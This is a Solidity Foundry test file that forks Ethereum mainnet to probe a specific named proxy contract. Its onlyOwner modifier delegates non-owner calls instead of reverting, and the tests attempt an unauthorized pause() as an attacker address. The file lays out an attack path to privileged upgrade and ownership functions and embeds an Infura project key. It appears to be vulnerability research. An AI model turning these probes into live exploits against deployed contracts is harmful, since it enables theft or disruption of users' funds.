// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title PausableUpgradableProxy Deep Analysis
 * @notice CRITICAL POTENTIAL VULNERABILITY FOUND
 *
 * VULNERABILITY: onlyOwner modifier delegates instead of reverting
 *
 * The modifier code:
 * modifier onlyOwner() {
 *     if (msg.sender == StorageSlot.getAddressSlot(ADMIN_SLOT).value) {
 *         _;
 *     } else {
 *         delegate();  // <-- DELEGATES instead of REVERTING!
 *     }
 * }
 *
 * ATTACK SCENARIO:
 * 1. Attacker calls pause(), unpause(), upgrade(), or transferOwnership()
 * 2. Since attacker != admin, the call DELEGATES to implementation
 * 3. If implementation has matching function signatures or permissive fallback,
 *    attacker could execute privileged operations
 *
 * This is a NOVEL vulnerability - the modifier pattern is inverted!
 */
contract PausableProxyAnalysisTest is Test {
    // The proxy contract
    address constant PAUSABLE_PROXY = 0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function test_readProxyState() public view {
        console.log("=== PAUSABLE PROXY STATE ===");
        console.log("Proxy Address:", PAUSABLE_PROXY);

        // Check code size to confirm contract exists
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(PAUSABLE_PROXY)
        }
        console.log("Code Size:", codeSize);

        // Try to read admin slot (EIP-1967)
        // ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103
        bytes32 adminSlot = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 adminValue = vm.load(PAUSABLE_PROXY, adminSlot);
        address admin = address(uint160(uint256(adminValue)));
        console.log("Admin:", admin);

        // Read implementation slot (EIP-1967)
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 implValue = vm.load(PAUSABLE_PROXY, implSlot);
        address implementation = address(uint160(uint256(implValue)));
        console.log("Implementation:", implementation);

        // Check if paused - try to read paused slot if it exists
        // This depends on the implementation
        console.log("================================");
    }

    function test_analyzeModifierVulnerability() public view {
        console.log("");
        console.log("=== MODIFIER VULNERABILITY ANALYSIS ===");
        console.log("");
        console.log("The onlyOwner modifier has INVERTED logic:");
        console.log("");
        console.log("EXPECTED pattern:");
        console.log("  if (msg.sender != owner) revert NotOwner();");
        console.log("  _;");
        console.log("");
        console.log("ACTUAL pattern:");
        console.log("  if (msg.sender == owner) { _; }");
        console.log("  else { delegate(); }  // <-- DANGER!");
        console.log("");
        console.log("IMPACT:");
        console.log("- Non-owner calls to pause() delegate to implementation");
        console.log("- Non-owner calls to upgrade() delegate to implementation");
        console.log("- Non-owner calls to transferOwnership() delegate to impl");
        console.log("");
        console.log("EXPLOITABILITY depends on implementation:");
        console.log("1. Does impl have pause/upgrade/transferOwnership functions?");
        console.log("2. Are those functions permissionless in implementation?");
        console.log("3. Does impl have permissive fallback/receive?");
        console.log("==========================================");
    }

    function test_attemptUnauthorizedPause() public {
        console.log("");
        console.log("=== ATTEMPTING UNAUTHORIZED PAUSE ===");

        // Read current state
        bytes32 adminSlot = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 adminValue = vm.load(PAUSABLE_PROXY, adminSlot);
        address admin = address(uint160(uint256(adminValue)));
        console.log("Admin address:", admin);

        // We're not the admin
        address attacker = address(0xBEEF);
        console.log("Attacker address:", attacker);
        console.log("Attacker is admin:", attacker == admin);

        // Try to call pause() as attacker
        console.log("");
        console.log("Attempting to call pause() as non-admin...");

        vm.prank(attacker);
        (bool success, bytes memory returnData) = PAUSABLE_PROXY.call(
            abi.encodeWithSignature("pause()")
        );

        console.log("Call succeeded:", success);
        if (!success && returnData.length > 0) {
            console.log("Revert reason length:", returnData.length);
        }

        // Check if the call went through to implementation
        // If it didn't revert with "not owner", it delegated!
        if (success) {
            console.log("!!! CRITICAL: pause() call SUCCEEDED as non-admin !!!");
            console.log("This confirms the vulnerability - call was delegated");
        } else {
            console.log("Call reverted (may have been caught by implementation)");
        }

        console.log("=====================================");
    }

    function test_checkImplementationForCollisions() public view {
        console.log("");
        console.log("=== IMPLEMENTATION COLLISION CHECK ===");

        // Get implementation address
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 implValue = vm.load(PAUSABLE_PROXY, implSlot);
        address implementation = address(uint160(uint256(implValue)));
        console.log("Implementation:", implementation);

        // Check if implementation has pause/upgrade functions
        // by checking if staticcall returns data
        console.log("");
        console.log("Function selectors to check:");
        console.log("pause() selector:", uint32(bytes4(keccak256("pause()"))));
        console.log("unpause() selector:", uint32(bytes4(keccak256("unpause()"))));
        console.log("upgrade(address) selector:", uint32(bytes4(keccak256("upgrade(address)"))));
        console.log("transferOwnership(address) selector:", uint32(bytes4(keccak256("transferOwnership(address)"))));

        // If implementation has these functions with different access control,
        // the proxy's admin functions would delegate and execute them!
        console.log("=======================================");
    }
}
